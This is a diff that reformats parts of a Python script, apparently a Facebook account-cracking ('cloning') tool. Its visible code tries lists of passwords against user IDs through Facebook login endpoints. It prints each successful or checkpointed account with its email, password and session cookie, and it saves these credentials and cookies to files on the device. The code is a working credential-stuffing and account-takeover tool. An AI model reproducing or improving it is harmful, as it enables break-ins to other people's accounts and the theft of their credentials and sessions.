@@ -370,6 +370,7 @@ def main():
         print(f"{lg}  [✘] OPTION:{dg} INVALID")
         main()
 
+
 def method():
     gxdslogo()
     print(f"{lg}  [1] MOBILE")
@@ -378,21 +379,22 @@ def method():
     print(f"{dg}  ————————————————————————————————————————")
     mxth = input(f"{lgr} [+] CHOOSE METHOD:")
     if mxth == "1":
-      fb = "m"
-      fb1 = "M1"
-      gxdsclone()
+        fb = "m"
+        fb1 = "M1"
+        gxdsclone()
     elif mxth == "2":
-      fb = "mbasic"
-      fb1 = "M2"
-      gxdsclone()
+        fb = "mbasic"
+        fb1 = "M2"
+        gxdsclone()
     elif mxth == "3":
-      fb = "free"
-      fb1 = "M3"
-      gxdsclone()
+        fb = "free"
+        fb1 = "M3"
+        gxdsclone()
     else:
-      fb = "n"
-      fb1 = "M4"
-      gxdsclone()
+        fb = "n"
+        fb1 = "M4"
+        gxdsclone()
+
 
 # FILE PATH
 def gxdsclone():
@@ -561,11 +563,15 @@ def result(oks):
         input(f"{dg}  [+] PRESS ENTER TO GO BACK")
         main()
 
+
 # API
 def gxds_files(uid, pxss, fb, fb1, tl):
     global oks, loop, cps, ugen
     session = requests.Session()
-    sys.stdout.write(f"\r{dg}  [GXDS-{fb1}]--[%s/%s]--[CP-%s]~[HITS-%s] \r"%(loop,tl,len(cps),len(oks))),
+    sys.stdout.write(
+        f"\r{dg}  [GXDS-{fb1}]--[%s/%s]--[CP-%s]~[HITS-%s] \r"
+        % (loop, tl, len(cps), len(oks))
+    ),
     sys.stdout.flush()
     try:
         for ps in pxss:
@@ -620,13 +626,15 @@ def gxds_files(uid, pxss, fb, fb1, tl):
                         for key, value in session.cookies.get_dict().items()
                     ]
                 )
-                print(f"""{lgr} -- [GXDS HITS] --
+                print(
+                    f"""{lgr} -- [GXDS HITS] --
  EMAIL  : {uid} 
  PASS   : {ps} 
  JOINED : {yrs}
  COOKIE : {coki}
  AGENT  : {ugen}
-""")
+"""
+                )
                 open("/sdcard/gxds-ok.txt", "a").write(uid + "|" + ps + "\n")
                 open("/sdcard/gxds-cookies.txt", "a").write(coki + "\n")
                 oks.append(uid)
@@ -638,23 +646,24 @@ def gxds_files(uid, pxss, fb, fb1, tl):
                         for key, value in session.cookies.get_dict().items()
                     ]
                 )
-                print(f"""{lr} -- [GXDS CHECKPOINT] --
+                print(
+                    f"""{lr} -- [GXDS CHECKPOINT] --
  EMAIL  : {uid} 
  PASS   : {ps} 
  JOINED : {yrs}
  COOKIE : {coki}
  AGENT  : {ugen}
-""")
+"""
+                )
                 open("/sdcard/gxds-cp.txt", "a").write(uid + "|" + ps + "\n")
                 open("/sdcard/gxds-cookies.txt", "a").write(coki + "\n")
                 cps.append(uid)
                 break
             else:
-              continue
+                continue
         loop += 1
     except:
-     pass
-
+        pass
 
 
 # FORWARDER
